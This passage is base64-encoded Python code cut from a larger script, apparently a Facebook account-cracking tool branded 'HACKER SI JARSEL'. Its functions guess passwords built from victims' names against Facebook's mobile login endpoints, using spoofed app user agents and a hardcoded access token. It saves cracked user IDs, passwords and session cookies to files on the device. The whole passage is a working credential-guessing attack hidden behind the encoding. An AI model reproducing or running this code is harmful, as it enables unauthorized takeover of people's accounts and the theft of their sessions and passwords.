ICAgICAgICAgICAgYWNjZWVzX3Rva2VuID0gJzM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicKICAgICAgICAgICAgZmJhdiA9IGYne3JhbmRvbS5yYW5kaW50KDExMSw5OTkpfS4wLjAue3JhbmRvbS5yYW5kaW50KDExLDk5KX0ue3JhbmRvbS5yYW5kaW50KDExMSw5OTkpfScKICAgICAgICAgICAgZmJidiA9IHN0cihyYW5kb20ucmFuZGludCgwMDAwMDAwMDAsOTk5OTk5OTk5KSkKICAgICAgICAgICAgYWNjZWVzX3Rva2VuID0gJzM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicKICAgICAgICAgICAgZmJhdiA9IGYne3JhbmRvbS5yYW5kaW50KDExMSw5OTkpfS4wLjAue3JhbmRvbS5yYW5kaW50KDExLDk5KX0ue3JhbmRvbS5yYW5kaW50KDExMSw5OTkpfScKICAgICAgICAgICAgdWFkZHggPSBmJ1tGQkFOL0ZCNEE7RkJBVi8nK3N0cihyYW5kb20ucmFuZGludCgxMSw5OSkpKycuMC4wLicrc3RyKHJhbmRvbS5yYW5kaW50KDExMTEsOTk5OSkpKyc7RkJCVi8nK3N0cihyYW5kb20ucmFuZGludCgxMTExMTExLDk5OTk5OTkpKSsnO1tGQkFOL0ZCNEE7RkJBVi8zMDkuMC4wLjQ3LjExOTtGQkJWLzI3NzQ0NDc1NjtGQkRNL3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0xOTIwfTtGQkxDL2RlX0RFO0ZCUlYvMjc5ODY1MjgyO0ZCQ1IvV2lsbGtvbW1lbjtGQk1GL3NhbXN1bmc7RkJCRC9zYW1zdW5nO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL1NNLUM3MDAwO0ZCU1YvOC4wLjA7RkJPUC8xOTtGQkNBL2FybWVhYmktdjdhOmFybWVhYmk7XScKICAgICAgICAgICAgaGVhZCA9IHsnVXNlci1BZ2VudCc6dWFkZHgsJ0FjY2VwdC1FbmNvZGluZyc6J2d6aXAsIGRlZmxhdGUnLCdDb25uZWN0aW9uJzonY2xvc2UnLCdDb250ZW50LVR5cGUnOidhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLCdIb3N0JzonZ3JhcGguZmFjZWJvb2suY29tJywnWC1GQi1OZXQtSE5JJzpzdHIocmFuZG9tLnJhbmRpbnQoMmU0LCA0ZTQpKSwnWC1GQi1TSU0tSE5JJzpzdHIocmFuZG9tLnJhbmRpbnQoMmU0LCA0ZTQpKSwnQXV0aG9yaXphdGlvbic6J09BdXRoIDM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicsJ1gtRkItQ29ubmVjdGlvbi1UeXBlJzonV0lGSScsJ1gtVGlnb24tSXMtUmV0cnknOidGYWxzZScsJ3gtZmItc2Vzc2lvbi1pZCc6J25pZD1qaVoreU5OQmdid0M7cGlkPU1haW47dGlkPTEzMjtuYz0xO2ZjPTA7YmM9MDtjaWQ9NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLCd4LWZiLWRldmljZS1ncm91cCc6JzUxMjAnLCdYLUZCLUZyaWVuZGx5LU5hbWUnOidWaWV3ZXJSZWFjdGlvbnNNdXRhdGlvbicsJ1gtRkItUmVxdWVzdC1BbmFseXRpY3MtVGFncyc6J2dyYXBoc2VydmljZScsJ1gtRkItSFRUUC1FbmdpbmUnOidMaWdlcicsJ1gtRkItQ2xpZW50LUlQJzonVHJ1ZScsJ1gtRkItU2VydmVyLUNsdXN0ZXInOidUcnVlJywneC1mYi1jb25uZWN0aW9uLXRva2VuJzonNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInfQogICAgICAgICAgICBkYXRhID0geydhZGlkJzpzdHIodXVpZC51dWlkNCgpKSwnZm9ybWF0JzonanNvbicsJ2RldmljZV9pZCc6c3RyKHV1aWQudXVpZDQoKSksJ2VtYWlsJzppZHMsJ3Bhc3N3b3JkJzpwYXMsJ2dlbmVyYXRlX2FuYWx5dGljc19jbGFpbXMnOicxJywnY29tbXVuaXR5X2lkJzonJywnY3BsJzondHJ1ZScsJ3RyeV9udW0nOicxJywnZmFtaWx5X2RldmljZV9pZCc6c3RyKHV1aWQudXVpZDQoKSksJ2NyZWRlbnRpYWxzX3R5cGUnOidwYXNzd29yZCcsJ3NvdXJjZSc6J2xvZ2luJywnZXJyb3JfZGV0YWlsX3R5cGUnOididXR0b25fd2l0aF9kaXNhYmxlZCcsJ2Vucm9sbF9taXNhdXRoJzonZmFsc2UnLCdnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMnOicxJywnZ2VuZXJhdGVfbWFjaGluZV9pZCc6JzEnLCdjdXJyZW50bHlfbG9nZ2VkX2luX3VzZXJpZCc6JzAnLCdsb2NhbGUnOidlc19FUycsJ2NsaWVudF9jb3VudHJ5X2NvZGUnOidFUycsJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6J2F1dGhlbnRpY2F0ZScsJ2FwaV9rZXknOic2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicsJ2FjY2Vzc190b2tlbic6YWNjZWVzX3Rva2VufQogICAgICAgICAgICBwbyA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2F1dGgvbG9naW4nLGRhdGE9ZGF0YSxoZWFkZXJzPWhlYWQpLmpzb24oKQogICAgICAgICAgICBpZiAnc2Vzc2lvbl9rZXknIGluIHBvOgogICAgICAgICAgICAgICAgICAgIHVpZCA9IHN0cihwb1sndWlkJ10pCiAgICAgICAgICAgICAgICAgICAgY2trayA9ICI7Ii5qb2luKGlbIm5hbWUiXSsiPSIraVsidmFsdWUiXSBmb3IgaSBpbiBwb1sic2Vzc2lvbl9jb29raWVzIl0pCiAgICAgICAgICAgICAgICAgICAgc3NiYiA9IGJhc2U2NC5iNjRlbmNvZGUob3MudXJhbmRvbSgxOCkpLmRlY29kZSgpLnJlcGxhY2UoIj0iLCIiKS5yZXBsYWNlKCIrIiwiXyIpLnJlcGxhY2UoIi8iLCItIikKICAgICAgICAgICAgICAgICAgICBjb29raWUgPSBmInNiPXtzc2JifTt7Y2tra30iCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xyXHJceDFiWzM4OzU7MTk2bVtceDFiWzM4OzU7NDZtSmFzcmVsXHgxYlsxOzk3bS1ceDFiWzM4OzU7NDZt8J+Smlx4MWJbMzg7NTsxOTZtXVx4MWJbMzg7NTs0Nm0gJyt1aWQrJ3wnK3BhcykKICAgICAgICAgICAgICAgICAgICAjbGluZSgpCiAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAnSmFzcmVsLUZJTEUtT0sudHh0JykKICAgICAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL0hBQ0tFUiBTSSBKQVJTRUwtRklMRS1PSy1DT09LSUUtTTEudHh0JywnYScpLndyaXRlKHVpZCsnfCcrcGFzKycgPj4+ICcrY29va2llKydcbicpCiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ2EnKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKHVpZCsnfCcrcGFzKydcbicpCiAgICAgICAgICAgICAgICAgICAgb2tzLmFwcGVuZCh1aWQpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcG9bJ2Vycm9yJ11bJ21lc3NhZ2UnXToKICAgICAgICAgICAgICAgICAgICB1aWQgPSBzdHIocG9bJ2Vycm9yJ11bJ2Vycm9yX2RhdGEnXVsndWlkJ10pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZidcclxyXDMzWzFtXDMzWzE7MzVtIFtKQVMtQ1BdICcrdWlkKycgfCAnK3BhcysnXDAzM1sxOzk3bScpCiAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAnSkFTLUZJTEUtQ1AudHh0JykKICAgICAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL0phc3JlbC1DUC50eHQnLCdhJykud3JpdGUodWlkKyd8JytwYXMrJ1xuJykKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAnYScpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUodWlkKyd8JytwYXMrJ1xuJykKICAgICAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKHVpZCkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICBsb29wKz0xCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICAgICAgdGltZS5zbGVlcCgyMCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChlKQogICAgICAgIHBhc3MKI+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSBNZXRob2QgMuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSMKZGVmIGFwaTIoaWRzLG5hbWVzLHBhc3NsaXN0KToKICAgIHRyeToKICAgICAgICBnbG9iYWwgb2ssbG9vcCxzaW1faWQKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYnXHJceDFiWzM4OzU7MTk2bSBbXHgxYlszODs1OzQ2bUhBQ0tFUiBTSSBKQVJTRUxceDFiWzE7OTdtLVx4MWJbMzg7NTs0Nm1NMlx4MWJbMzg7NTsxOTZtXVx4MWJbMTs5N20tXHgxYlszODs1OzE5Nm1bXHgxYlszODs1OzQ2bSVzXHgxYlszODs1OzE5Nm1dXHgxYlsxOzk3bS1ceDFiWzM4OzU7MTk2bVtceDFiWzM4OzU7NDZtT0s6JXNceDFiWzM4OzU7MTk2bV0nJShsb29wLGxlbihva3MpKSk7c3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgZm4gPSBuYW1lcy5zcGxpdCgnICcpWzBdCiAgICAgICAgdHJ5OgogICAgICAgICAgICBsbiA9IG5hbWVzLnNwbGl0KCcgJylbMV0KICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIGxuID0gZm4KICAgICAgICBmb3IgcHcgaW4gcGFzc2xpc3Q6CiAgICAgICAgICAgIHBhcyA9IHB3LnJlcGxhY2UoJ2ZpcnN0Jyxmbi5sb3dlcigpKS5yZXBsYWNlKCdGaXJzdCcsZm4pLnJlcGxhY2UoJ2xhc3QnLGxuLmxvd2VyKCkpLnJlcGxhY2UoJ0xhc3QnLGxuKS5yZXBsYWNlKCdOYW1lJyxuYW1lcykucmVwbGFjZSgnbmFtZScsbmFtZXMubG93ZXIoKSkKICAgICAgICAgICAgYWNjZWVzX3Rva2VuID0gJzM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicKICAgICAgICAgICAgZmJhdiA9IGYne3JhbmRvbS5yYW5kaW50KDExMSw5OTkpfS4wLjAue3JhbmRvbS5yYW5kaW50KDExLDk5KX0ue3JhbmRvbS5yYW5kaW50KDExMSw5OTkpfScKICAgICAgICAgICAgZmJidiA9IHN0cihyYW5kb20ucmFuZGludCgwMDAwMDAwMDAsOTk5OTk5OTk5KSkKICAgICAgICAgICAgYWNjZWVzX3Rva2VuID0gJzM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicKICAgICAgICAgICAgdWFkZHggPSBmJ1tGQkFOL0ZCNEE7RkJBVi8nK3N0cihyYW5kb20ucmFuZGludCgxMSw5OSkpKycuMC4wLicrc3RyKHJhbmRvbS5yYW5kaW50KDExMTEsOTk5OSkpKyc7RkJCVi8nK3N0cihyYW5kb20ucmFuZGludCgxMTExMTExLDk5OTk5OTkpKSsnO1tGQkFOL0ZCNEE7RkJBVi82MS4wLjAuMTUuNjk7RkJCVi8yMDc0ODExODtGQkRNL3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0xOTIwfTtGQkxDL2VuX1VTO0ZCQ1IvUm9nZXJzIFdpcmVsZXNzO0ZCTUYvT25lUGx1cztGQkJEL09uZVBsdXM7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvT05FIEEyMDA1O0ZCU1YvNS4xLjE7bnVsbEZCQ0EvYXJtZWFiaS12N2E6YXJtZWFiaTtdJwogICAgICAgICAgICBoZWFkID0geydVc2VyLUFnZW50Jzp1YWRkeCwKICAgICAgICAgICAgJ0FjY2VwdC1FbmNvZGluZyc6J2d6aXAsIGRlZmxhdGUnLAogICAgICAgICAgICAnQ29ubmVjdGlvbic6J2Nsb3NlJywKICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsCiAgICAgICAgICAgICdIb3N0JzonZ3JhcGguZmFjZWJvb2suY29tJywKICAgICAgICAgICAgJ1gtRkItTmV0LUhOSSc6c3RyKHJhbmRvbS5yYW5kaW50KDJlNCwgNGU0KSksCiAgICAgICAgICAgICdYLUZCLVNJTS1ITkknOnN0cihyYW5kb20ucmFuZGludCgyZTQsIDRlNCkpLAogICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6J09BdXRoIDM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicsCiAgICAgICAgICAgICdYLUZCLUNvbm5lY3Rpb24tVHlwZSc6J1dJRkknLAogICAgICAgICAgICAnWC1UaWdvbi1Jcy1SZXRyeSc6J0ZhbHNlJywKICAgICAgICAgICAgJ3gtZmItc2Vzc2lvbi1pZCc6J25pZD1qaVoreU5OQmdid0M7cGlkPU1haW47dGlkPTEzMjtuYz0xO2ZjPTA7YmM9MDtjaWQ9NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICAgICAneC1mYi1kZXZpY2UtZ3JvdXAnOic1MTIwJywKICAgICAgICAgICAgJ1gtRkItRnJpZW5kbHktTmFtZSc6J1ZpZXdlclJlYWN0aW9uc011dGF0aW9uJywKICAgICAgICAgICAgJ1gtRkItUmVxdWVzdC1BbmFseXRpY3MtVGFncyc6J2dyYXBoc2VydmljZScsCiAgICAgICAgICAgICdYLUZCLUhUVFAtRW5naW5lJzonTGlnZXInLAogICAgICAgICAgICAnWC1GQi1DbGllbnQtSVAnOidUcnVlJywKICAgICAgICAgICAgJ1gtRkItU2VydmVyLUNsdXN0ZXInOidUcnVlJywKICAgICAgICAgICAgJ3gtZmItY29ubmVjdGlvbi10b2tlbic6JzYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJ30KICAgICAgICAgICAgZGF0YSA9IHsnYWRpZCc6c3RyKHV1aWQudXVpZDQoKSksCiAgICAgICAgICAgICdmb3JtYXQnOidqc29uJywKICAgICAgICAgICAgJ2RldmljZV9pZCc6c3RyKHV1aWQudXVpZDQoKSksCiAgICAgICAgICAgICdlbWFpbCc6aWRzLAogICAgICAgICAgICAncGFzc3dvcmQnOnBhcywKICAgICAgICAgICAgJ2dlbmVyYXRlX2FuYWx5dGljc19jbGFpbXMnOicxJywKICAgICAgICAgICAgJ2NvbW11bml0eV9pZCc6JycsJ2NwbCc6J3RydWUnLAogICAgICAgICAgICAndHJ5X251bSc6JzEnLAogICAgICAgICAgICAnZmFtaWx5X2RldmljZV9pZCc6c3RyKHV1aWQudXVpZDQoKSksCiAgICAgICAgICAgICdjcmVkZW50aWFsc190eXBlJzoncGFzc3dvcmQnLCdzb3VyY2UnOidsb2dpbicsCiAgICAgICAgICAgICdlcnJvcl9kZXRhaWxfdHlwZSc6J2J1dHRvbl93aXRoX2Rpc2FibGVkJywKICAgICAgICAgICAgJ2Vucm9sbF9taXNhdXRoJzonZmFsc2UnLCdnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMnOicxJywKICAgICAgICAgICAgJ2dlbmVyYXRlX21hY2hpbmVfaWQnOicxJywKICAgICAgICAgICAgJ2N1cnJlbnRseV9sb2dnZWRfaW5fdXNlcmlkJzonMCcsCiAgICAgICAgICAgICdsb2NhbGUnOidlc19FUycsJ2NsaWVudF9jb3VudHJ5X2NvZGUnOidFUycsCiAgICAgICAgICAgICdmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUnOidhdXRoZW50aWNhdGUnLAogICAgICAgICAgICAnYXBpX2tleSc6JzYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJywnYWNjZXNzX3Rva2VuJzphY2NlZXNfdG9rZW59CiAgICAgICAgICAgIHBvID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGkuZmFjZWJvb2suY29tL2F1dGgvbG9naW4nLGRhdGE9ZGF0YSxoZWFkZXJzPWhlYWQpLmpzb24oKQogICAgICAgICAgICBpZiAnc2Vzc2lvbl9rZXknIGluIHBvOgogICAgICAgICAgICAgICAgICAgIHVpZCA9IHN0cihwb1sndWlkJ10pCiAgICAgICAgICAgICAgICAgICAgY2trayA9ICI7Ii5qb2luKGlbIm5hbWUiXSsiPSIraVsidmFsdWUiXSBmb3IgaSBpbiBwb1sic2Vzc2lvbl9jb29raWVzIl0pCiAgICAgICAgICAgICAgICAgICAgc3NiYiA9IGJhc2U2NC5iNjRlbmNvZGUob3MudXJhbmRvbSgxOCkpLmRlY29kZSgpLnJlcGxhY2UoIj0iLCIiKS5yZXBsYWNlKCIrIiwiXyIpLnJlcGxhY2UoIi8iLCItIikKICAgICAgICAgICAgICAgICAgICBjb29raWUgPSBmInNiPXtzc2JifTt7Y2tra30iCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xyXHJceDFiWzM4OzU7MTk2bVtceDFiWzM4OzU7NDZtVG94aWNceDFiWzE7OTdtLVx4MWJbMzg7NTs0Nm3wn5KaXHgxYlszODs1OzE5Nm1dXHgxYlszODs1OzQ2bSAnK3VpZCsnfCcrcGFzKQogICAgICAgICAgICAgICAgICAgICNsaW5lKCkKICAgICAgICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICdKYXMtRklMRS1PSy50eHQnKQogICAgICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvVG94aWMvSmFzLUZJTEUtT0stQ09PS0lFLU0yLnR4dCcsJ2EnKS53cml0ZSh1aWQrJ3wnK3BhcysnID4+PiAnK2Nvb2tpZSsnXG4nKQogICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdhJykgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZSh1aWQrJ3wnK3BhcysnXG4nKQogICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodWlkKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHBvWydlcnJvciddWydtZXNzYWdlJ106CiAgICAgICAgICAgICAgICAgICAgdWlkID0gc3RyKHBvWydlcnJvciddWydlcnJvcl9kYXRhJ11bJ3VpZCddKQogICAgICAgICAgICAgICAgICAgIHByaW50KGYnXHJcclwzM1sxbVwzM1sxOzM1bSBbSkFTLUNQXSAnK3VpZCsnIHwgJytwYXMrJ1wwMzNbMTs5N20nKQogICAgICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihmb2xkZXJfcGF0aCwgJ0pBUy1GSUxFLUNQLnR4dCcpCiAgICAgICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9KYXNyZWwtQ1AudHh0JywnYScpLndyaXRlKHVpZCsnfCcrcGFzKydcbicpCiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ2EnKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKHVpZCsnfCcrcGFzKydcbicpCiAgICAgICAgICAgICAgICAgICAgY3BzLmFwcGVuZCh1aWQpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgbG9vcCs9MQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgIHRpbWUuc2xlZXAoMjApCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwoj4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBIE1ldGhvZCAz4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBIwpkZWYgYXBpMyhpZHMsbmFtZXMscGFzc2xpc3QpOgogICAgdHJ5OgogICAgICAgIGdsb2JhbCBvayxsb29wLHNpbV9pZAogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidcclx4MWJbMzg7NTsxOTZtIFtceDFiWzM4OzU7NDZtSEFDS0VSIFNJIEpBUlNFTFx4MWJbMTs5N20tTTNceDFiWzM4OzU7MTk2bV1ceDFiWzE7OTdtLVx4MWJbMzg7NTsxOTZtW1x4MWJbMzg7NTs0Nm0lc1x4MWJbMzg7NTsxOTZtXVx4MWJbMTs5N20tXHgxYlszODs1OzE5Nm1bXHgxYlszODs1OzQ2bU9LOiVzXHgxYlszODs1OzE5Nm1dJyUobG9vcCxsZW4ob2tzKSkpO3N5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIGZuID0gbmFtZXMuc3BsaXQoJyAnKVswXQogICAgICAgIHRyeToKICAgICAgICAgICAgbG4gPSBuYW1lcy5zcGxpdCgnICcpWzFdCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBsbiA9IGZuCiAgICAgICAgZm9yIHB3IGluIHBhc3NsaXN0OgogICAgICAgICAgICBwYXMgPSBwdy5yZXBsYWNlKCdmaXJzdCcsZm4ubG93ZXIoKSkucmVwbGFjZSgnRmlyc3QnLGZuKS5yZXBsYWNlKCdsYXN0Jyxsbi5sb3dlcigpKS5yZXBsYWNlKCdMYXN0JyxsbikucmVwbGFjZSgnTmFtZScsbmFtZXMpLnJlcGxhY2UoJ25hbWUnLG5hbWVzLmxvd2VyKCkpCiAgICAgICAgICAgIGFjY2Vlc190b2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInCiAgICAgICAgICAgIGZiYXYgPSBmJ3tyYW5kb20ucmFuZGludCgxMTEsOTk5KX0uMC4wLntyYW5kb20ucmFuZGludCgxMSw5OSl9LntyYW5kb20ucmFuZGludCgxMTEsOTk5KX0nCiAgICAgICAgICAgIGZiYnYgPSBzdHIocmFuZG9tLnJhbmRpbnQoMDAwMDAwMDAwLDk5OTk5OTk5OSkpCiAgICAgICAgICAgIGFjY2Vlc190b2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInCiAgICAgICAgICAgIHVhZGR4ID0gZidbRkJBTi9GQjRBO0ZCQVYvJytzdHIocmFuZG9tLnJhbmRpbnQoMTEsOTkpKSsnLjAuMC4nK3N0cihyYW5kb20ucmFuZGludCgxMTExLDk5OTkpKSsnO0ZCQlYvJytzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMSw5OTk5OTk5KSkrJztbRkJBTi9GQjRBO0ZCQVYvNjEuMC4wLjE1LjY5O0ZCQlYvMjA3NDgxMTg7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MTkyMH07RkJMQy9lc19FUztGQkNSL21vdmlzdGFyO0ZCTUYvYnE7RkJCRC9icTtGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9BcXVhcmlzIE01O0ZCU1YvNS4xLjE7bnVsbEZCQ0EvYXJtZWFiaS12N2E6YXJtZWFiaTtdJwogICAgICAgICAgICBoZWFkID0geydVc2VyLUFnZW50Jzp1YWRkeCwKICAgICAgICAgICAgJ0FjY2VwdC1FbmNvZGluZyc6J2d6aXAsIGRlZmxhdGUnLAogICAgICAgICAgICAnQ29ubmVjdGlvbic6J2Nsb3NlJywKICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsCiAgICAgICAgICAgICdIb3N0JzonZ3JhcGguZmFjZWJvb2suY29tJywKICAgICAgICAgICAgJ1gtRkItTmV0LUhOSSc6c3RyKHJhbmRvbS5yYW5kaW50KDJlNCwgNGU0KSksCiAgICAgICAgICAgICdYLUZCLVNJTS1ITkknOnN0cihyYW5kb20ucmFuZGludCgyZTQsIDRlNCkpLAogICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6J09BdXRoIDM1MDY4NTUzMTcyOHw2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicsCiAgICAgICAgICAgICdYLUZCLUNvbm5lY3Rpb24tVHlwZSc6J1dJRkknLAogICAgICAgICAgICAnWC1UaWdvbi1Jcy1SZXRyeSc6J0ZhbHNlJywKICAgICAgICAgICAgJ3gtZmItc2Vzc2lvbi1pZCc6J25pZD1qaVoreU5OQmdid0M7cGlkPU1haW47dGlkPTEzMjtuYz0xO2ZjPTA7YmM9MDtjaWQ9NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICAgICAneC1mYi1kZXZpY2UtZ3JvdXAnOic1MTIwJywKICAgICAgICAgICAgJ1gtRkItRnJpZW5kbHktTmFtZSc6J1ZpZXdlclJlYWN0aW9uc011dGF0aW9uJywKICAgICAgICAgICAgJ1gtRkItUmVxdWVzdC1BbmFseXRpY3MtVGFncyc6J2dyYXBoc2VydmljZScsCiAgICAgICAgICAgICdYLUZCLUhUVFAtRW5naW5lJzonTGlnZXInLAogICAgICAgICAgICAnWC1GQi1DbGllbnQtSVAnOidUcnVlJywKICAgICAgICAgICAgJ1gtRkItU2VydmVyLUNsdXN0ZXInOidUcnVlJywKICAgICAgICAgICAgJ3gtZmItY29ubmVjdGlvbi10b2tlbic6JzYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJ30KICAgICAgICAgICAgZGF0YSA9IHsnYWRpZCc6c3RyKHV1aWQudXVpZDQoKSksCiAgICAgICAgICAgICdmb3JtYXQnOidqc29uJywKICAgICAgICAgICAgJ2RldmljZV9pZCc6c3RyKHV1aWQudXVpZDQoKSksCiAgICAgICAgICAgICdlbWFpbCc6aWRzLAogICAgICAgICAgICAncGFzc3dvcmQnOnBhcywKICAgICAgICAgICAgJ2dlbmVyYXRlX2FuYWx5dGljc19jbGFpbXMnOicxJywKICAgICAgICAgICAgJ2NvbW11bml0eV9pZCc6JycsJ2NwbCc6J3RydWUnLAogICAgICAgICAgICAndHJ5X251bSc6JzEnLAogICAgICAgICAgICAnZmFtaWx5X2RldmljZV9pZCc6c3RyKHV1aWQudXVpZDQoKSksCiAgICAgICAgICAgICdjcmVkZW50aWFsc190eXBlJzoncGFzc3dvcmQnLCdzb3VyY2UnOidsb2dpbicsCiAgICAgICAgICAgICdlcnJvcl9kZXRhaWxfdHlwZSc6J2J1dHRvbl93aXRoX2Rpc2FibGVkJywKICAgICAgICAgICAgJ2Vucm9sbF9taXNhdXRoJzonZmFsc2UnLCdnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMnOicxJywKICAgICAgICAgICAgJ2dlbmVyYXRlX21hY2hpbmVfaWQnOicxJywKICAgICAgICAgICAgJ2N1cnJlbnRseV9sb2dnZWRfaW5fdXNlcmlkJzonMCcsCiAgICAgICAgICAgICdsb2NhbGUnOidlc19FUycsJ2NsaWVudF9jb3VudHJ5X2NvZGUnOidFUycsCiAgICAgICAgICAgICdmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUnOidhdXRoZW50aWNhdGUnLAogICAgICAgICAgICAnYXBpX2tleSc6JzYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJywnYWNjZXNzX3Rva2VuJzphY2NlZXNfdG9rZW59CiAgICAgICAgICAgIHBvID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luJyxkYXRhPWRhdGEsaGVhZGVycz1oZWFkKS5qc29uKCkKICAgICAgICAgICAgaWYgJ3Nlc3Npb25fa2V5JyBpbiBwbzoKICAgICAgICAgICAgICAgICAgICB1aWQgPSBzdHIocG9bJ3VpZCddKQogICAgICAgICAgICAgICAgICAgIGNra2sgPSAiOyIuam9pbihpWyJuYW1lIl0rIj0iK2lbInZhbHVlIl0gZm9yIGkgaW4gcG9bInNlc3Npb25fY29va2llcyJdKQogICAgICAgICAgICAgICAgICAgIHNzYmIgPSBiYXNlNjQuYjY0ZW5jb2RlKG9zLnVyYW5kb20oMTgpKS5kZWNvZGUoKS5yZXBsYWNlKCI9IiwiIikuc